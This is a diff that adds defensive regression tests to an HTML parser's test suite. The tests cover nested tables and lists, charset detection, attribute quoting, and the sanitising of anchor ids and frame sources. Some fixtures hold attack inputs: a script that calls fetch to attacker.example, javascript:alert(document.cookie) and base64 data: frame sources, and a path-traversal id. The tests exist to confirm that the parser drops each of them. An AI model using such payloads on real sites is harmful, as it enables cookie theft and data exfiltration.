@@ -373,3 +373,220 @@ describe("htmlParser — technical manual structure (#1855)", () => {
     expect(result.diagnostics.map((d) => d.code)).not.toContain("HTML_CHARSET_MISMATCH");
   });
 });
+
+// ─── Post-merge audit regressions (Epic #1855, Issue #1886) ──────────────────
+
+describe("htmlParser — post-merge audit fixes (#1886)", () => {
+  it("does not truncate an outer table row at a nested sub-table's closing tag", () => {
+    // A parameter table where one cell lists sub-options in its own table. The pre-fix
+    // non-greedy `<tr>...</tr>` regex stopped at the INNER table's </tr>, dropping "Outer2" from
+    // the row structure — it leaked separately as stray body text instead of staying part of the
+    // "Table: ..." row projection, so assert it lands INSIDE that one row block.
+    const texts = blockTexts(
+      "<table><tr><td>Outer1<table><tr><td>Inner</td></tr></table></td>" +
+        "<td>Outer2</td></tr></table>",
+    );
+    const rowBlock = texts.find((t) => t.startsWith("Table:"));
+    expect(rowBlock).toBeDefined();
+    expect(rowBlock).toContain("Outer1");
+    expect(rowBlock).toContain("Inner");
+    expect(rowBlock).toContain("Outer2");
+    // Exactly one row was emitted for the outer table (the nested table must not produce its own
+    // independently-counted "Table: ..." row block collapsed into the outer one incorrectly).
+    expect(texts.filter((t) => t.startsWith("Table:"))).toHaveLength(1);
+  });
+
+  it("does not truncate a nested <dl> inside a <dd> — no sibling term/definition lost", () => {
+    const text = blockTexts(
+      "<dl><dt>Outer</dt><dd>OuterDef<dl><dt>Inner</dt><dd>InnerDef</dd></dl>Tail</dd>" +
+        "<dt>Sibling</dt><dd>SiblingDef</dd></dl>",
+    ).join(" ");
+    expect(text).toContain("Tail");
+    expect(text).toContain("Sibling: SiblingDef");
+  });
+
+  it("surfaces <table><caption> text instead of silently dropping it", () => {
+    const texts = blockTexts(
+      "<table><caption>Table 4-2: HTTP Status Codes</caption>" +
+        "<tr><td>200</td><td>OK</td></tr></table>",
+    );
+    expect(texts).toContain("Table caption: Table 4-2: HTTP Status Codes");
+  });
+
+  it("finds the real <title>, not a <title>-shaped literal inside an earlier <script>", () => {
+    const html =
+      '<html><head><script>var x = "<title>fake</title>";</script>' +
+      "<title>Real Title</title></head><body></body></html>";
+    const texts = blockTexts(html);
+    expect(texts).toContain("Real Title");
+    expect(texts.join(" ")).not.toContain("fake");
+  });
+
+  it("does not raise HTML_CHARSET_MISMATCH for prose that merely contains the word 'charset'", () => {
+    const result = htmlParser.parse(
+      selectionFromText(
+        "<html><body><p>Set the charset to auto in Settings &gt; Advanced</p></body></html>",
+        { extension: "html" },
+      ),
+      buildParserOptions({ now: () => 0 }),
+    );
+    expect(result.diagnostics.map((d) => d.code)).not.toContain("HTML_CHARSET_MISMATCH");
+  });
+
+  it("still detects a real <meta charset> mismatch after scoping the scan to <meta> tags", () => {
+    const result = htmlParser.parse(
+      selectionFromText(
+        '<html><head><meta charset="shift_jis"></head><body><p>Body.</p></body></html>',
+        { extension: "html" },
+      ),
+      buildParserOptions({ now: () => 0 }),
+    );
+    expect(result.diagnostics.map((d) => d.code)).toContain("HTML_CHARSET_MISMATCH");
+  });
+
+  it("does not mis-terminate a tag at a literal '>' inside a quoted attribute value", () => {
+    // Pre-fix: readTagAt's naive indexOf(">", ...) stopped inside the quoted title, corrupting
+    // tag.raw (losing `src`) and leaking the rest of the tag verbatim (incl. the query token)
+    // into normalizedText as ordinary body text.
+    const texts = blockTexts(
+      '<frameset><frame title="Section > Details" ' +
+        'src="https://manuals.example/private/path?token=abc123"></frameset>',
+    );
+    const joined = texts.join(" ");
+    expect(joined).toContain("Frame: /private/path");
+    expect(joined).not.toContain("token=abc123");
+    expect(joined).not.toContain("manuals.example");
+    expect(joined).not.toContain("Details");
+  });
+
+  it("does not corrupt a heading label when a preceding attribute contains a literal '>'", () => {
+    const { units } = parseHtml('<h2 title="Step 1 > Step 2">Overview</h2><p>Body.</p>');
+    const headingUnit = units.find(
+      (unit) => unit.kind === "html-block" && unit.headingPath?.includes("Overview") === true,
+    );
+    expect(headingUnit).toBeDefined();
+  });
+
+  it("rejects a path-like anchorId (contains '/') instead of accepting it as a slug", () => {
+    const { units } = parseHtml('<h2 id="../../etc/passwd">Traversal</h2><p>Body.</p>');
+    const unit = units.find((candidate) => candidate.kind === "html-block");
+    expect(unit?.kind === "html-block" ? unit.anchorId : "missing").toBeUndefined();
+  });
+
+  it("rejects an anchorId with an embedded quote character", () => {
+    const { units } = parseHtml(`<h2 id='a"b'>Entity</h2><p>Body.</p>`);
+    const unit = units.find((candidate) => candidate.kind === "html-block");
+    expect(unit?.kind === "html-block" ? unit.anchorId : "missing").toBeUndefined();
+  });
+
+  it("rejects a scheme-like anchorId that has no '//' (bypassing the old blocklist)", () => {
+    const { units } = parseHtml('<h1 id="javascript:alert(1)">Heading</h1><p>Body.</p>');
+    const unit = units.find((candidate) => candidate.kind === "html-block");
+    expect(unit?.kind === "html-block" ? unit.anchorId : "missing").toBeUndefined();
+  });
+
+  it("still accepts an ordinary heading-id anchor slug", () => {
+    const { units } = parseHtml('<h2 id="section-4.2:notes">Notes</h2><p>Body.</p>');
+    const unit = units.find((candidate) => candidate.kind === "html-block");
+    expect(unit?.kind === "html-block" ? unit.anchorId : undefined).toBe("section-4.2:notes");
+  });
+
+  it("rejects a javascript: frame src instead of forwarding it verbatim", () => {
+    const texts = blockTexts(
+      '<frameset><frame src="javascript:alert(document.cookie)">' + "</frameset>",
+    );
+    expect(texts.join(" ")).not.toContain("javascript:");
+    expect(texts.join(" ")).not.toContain("alert(");
+  });
+
+  it("rejects a data: frame src instead of forwarding an arbitrary base64 payload", () => {
+    const texts = blockTexts(
+      '<frameset><frame src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">' +
+        "</frameset>",
+    );
+    expect(texts.join(" ")).not.toContain("data:");
+    expect(texts.join(" ")).not.toContain("base64");
+  });
+
+  it("still surfaces an ordinary relative and absolute http(s) frame src", () => {
+    const texts = blockTexts(
+      '<frameset><frame src="toc.html"><frame src="https://manuals.example/a/b.html">' +
+        "</frameset>",
+    );
+    expect(texts).toContain("Frame: toc.html");
+    expect(texts).toContain("Frame: /a/b.html");
+  });
+
+  it("caps an oversized declared-charset label instead of embedding it unbounded", () => {
+    const hugeLabel = "a".repeat(2000);
+    const result = htmlParser.parse(
+      selectionFromText(
+        `<html><head><meta charset="${hugeLabel}"></head><body><p>Body.</p></body></html>`,
+        { extension: "html" },
+      ),
+      buildParserOptions({ now: () => 0 }),
+    );
+    const mismatch = result.diagnostics.find((d) => d.code === "HTML_CHARSET_MISMATCH");
+    expect(mismatch).toBeDefined();
+    expect(mismatch?.message.length ?? 0).toBeLessThan(300);
+  });
+
+  it("drops a <script> nested inside <pre>, <table>, <dl>, and <title> (GRD-003)", () => {
+    const secret = "sk-should-never-appear-9988";
+    const payload = `<script>const S="${secret}";fetch("http://attacker.example/x");</script>`;
+    const html =
+      `<html><head><title>${payload}Doc</title></head><body>` +
+      `<pre>${payload}code</pre>` +
+      `<table><tr><td>${payload}cell</td></tr></table>` +
+      `<dl><dt>Term</dt><dd>${payload}def</dd></dl>` +
+      "</body></html>";
+    const { text } = parseHtml(html);
+    expect(text).not.toContain(secret);
+    expect(text).not.toContain("attacker.example");
+    expect(text).not.toContain("<script");
+  });
+
+  it("drops a <script> nested in <table>/<dl> even when its body contains a literal closing tag", () => {
+    // A raw-text body containing a `</table>`- or `</dl>`-shaped substring (plausible in a JS
+    // string literal or a document.write template) must not be mistaken for the real close tag
+    // by the depth-aware nested-element walk — that would prematurely end the scan and leak the
+    // remainder of the script body verbatim (GRD-003), same class as the test above but exercised
+    // through findNestableElementEnd instead of the top-level body scanner.
+    const secret = "sk-nested-close-tag-should-never-appear-4477";
+    const tableHtml =
+      `<table><tr><td><script>var s = "</table>"; var t = "${secret}";</script>` +
+      "RealCellText</td></tr><tr><td>SecondRowCell</td></tr></table>";
+    const dlHtml =
+      `<dl><dt>Term</dt><dd><script>var s = "</dl>"; var t = "${secret}";</script>` +
+      "RealDefText</dd><dt>Sibling</dt><dd>SiblingDef</dd></dl>";
+    for (const html of [tableHtml, dlHtml]) {
+      const { text } = parseHtml(html);
+      expect(text).not.toContain(secret);
+      expect(text).not.toContain("<script");
+      expect(text).not.toContain("</table");
+      expect(text).not.toContain("</dl");
+    }
+    expect(blockTexts(tableHtml).join(" ")).toContain("SecondRowCell");
+    expect(blockTexts(dlHtml).join(" ")).toContain("Sibling: SiblingDef");
+  });
+
+  it("does not leak the rest of the document as raw markup after an unclosed attribute quote", () => {
+    // Pre-fix: an unterminated quote left the quote-aware tag scan tracking "inside a quote" all
+    // the way to EOF, so readTagAt reported the tag as absent and the scanner fell back to
+    // emitting raw, un-stripped markup as literal text for the REST OF THE DOCUMENT (an unbounded
+    // leak from one malformed tag), instead of degrading within the scope of that single tag.
+    const html = '<h2 id="x>Title</h2><p>Rest of body.</p>';
+    const { text } = parseHtml(html);
+    expect(text).not.toContain("<h2");
+    expect(text).not.toContain("</h2>");
+    expect(text).not.toContain("<p>");
+    expect(text).toContain("Rest of body.");
+  });
+
+  it("redacts a protocol-relative frame src instead of forwarding its host verbatim", () => {
+    const texts = blockTexts('<frameset><frame src="//evil.example/private/path"></frameset>');
+    const joined = texts.join(" ");
+    expect(joined).not.toContain("evil.example");
+    expect(joined).toContain("Frame: /private/path");
+  });
+});
